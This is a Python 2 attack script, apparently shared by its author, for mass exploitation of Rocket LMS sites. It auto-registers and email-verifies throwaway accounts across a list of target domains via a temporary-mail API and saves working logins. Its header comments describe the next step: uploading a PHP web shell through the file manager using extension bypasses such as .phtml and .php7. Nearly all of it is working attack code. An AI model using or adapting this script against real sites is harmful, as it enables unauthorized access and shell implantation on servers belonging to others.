#SAUS? https://medium.com/@davidhorison457/rocket-lms-shell-upload-vulnerability-c400665702f3
#jika login masuk dan muncul 500 error ganti path panel jadi filemanager
#If you log in and a 500 error appears, change the panel path to filemanager
#contoh  site.com/panel to site.com/filemanager
#Bypass Ext Shell : .php74 .php7 .phtml use u brain lah ngent
#Gak Semua Register Valid Sangat Disarankan Manual ! ':v
#Not all registrations are valid. Manual is highly recommended! ':v
import requests,os
from random import sample
import re,sys
import json
import time
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore,Style, init
import subprocess
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
reload(sys)  
sys.setdefaultencoding('utf8')
init(autoreset=True)


r = Fore.RED + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT
o = Fore.RESET + Style.RESET_ALL


def RandomGenerator(length):
    return ''.join(sample('abcdefghijklmnopqrstuvwxyz', length))

def JANCOKMATAMUSUUU(url):
    RANDOME = str('shin' + str(RandomGenerator(4)))
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36',
        }
        reqs = requests.get('https://'+url+'/register', headers=headers,verify=False)
        cookie = reqs.headers['Set-Cookie']
        mekdi = re.search(r'XSRF-TOKEN=([^;]+)', cookie)
        mekdi2 = re.search(r', ([^;]+)_session=([^;]+)', cookie)
        
        if mekdi and mekdi2:
            mekdii = mekdi.group(1)
            mekdii2_name = mekdi2.group(1)
            mekdii2_value = mekdi2.group(2)
            combined_cookies = {
                '{}_session'.format(mekdii2_name): mekdii2_value,
                'XSRF-TOKEN': mekdii,
            }

        TOKEN = re.findall('name="_token" value="(.*?)">', reqs.content)[0]
        print(y+'Get Token : ' +o+ TOKEN)
        JANCO = RANDOME + '@mailto.plus'
        data = {
            '_token': TOKEN,
            'email': JANCO,
            'country_code': '%2B1',
            'mobile': '',
            'full_name': RANDOME,
            'password': JANCO,
            'password_confirmation': JANCO,
            'timezone': 'Asia%2FKolkata',
            'referral_code': '',
            'term': '1',
        }
        req1 = requests.post('https://'+url+'/register', data=data, headers=headers,verify=False, cookies=combined_cookies,allow_redirects=True).content
        print(y+'Register With User : ' +o+ JANCO)
        req_idmail = requests.get('https://tempmail.plus/api/mails/?email=' + JANCO, headers=headers).content
        regex_idmail = re.findall('"first_id":(.*?),', req_idmail)[0]
        req_codemail = requests.get('https://tempmail.plus/api/mails/' + regex_idmail + '?email=' + JANCO, headers=headers).json()
        pattern = re.compile(r'\b\d{5}\b')
        matches = pattern.findall(str(req_codemail['text']))[0]
        data2 = {'_token': TOKEN,
        'username': JANCO,
		'code': matches,
		}
        req2 = requests.post('https://'+url+'/verification', data=data2,verify=False, headers=headers, cookies=combined_cookies,allow_redirects=False).content
        if '/panel</a>.' in req2:
            print (g+'Successed Login :'+o+ ' ' +'https://'+ url+'/login'+'|'+ JANCO +'|'+JANCO)
            open ('res.txt','a').write('https://'+ url+'/login'+'|'+ JANCO +'|'+JANCO+'\n')
            
        else:
            print(r+'JANCOKMATAMUSU'+o +' '+ url)
            


    except:
        pass

if __name__ == '__main__':
	os.system('cls' if os.name == 'nt' else 'clear')
	print "{} Rocket LMS Register User - File Upload| {}Shin Code\n".format(y,c)
	urll = open(raw_input('List:~# '),'r').read().replace('http://','').replace('/','').replace('https://','').splitlines()
	pool = ThreadPool(int(10))
	pool.map(JANCOKMATAMUSUUU, urll)
	pool.close()
	pool.join()
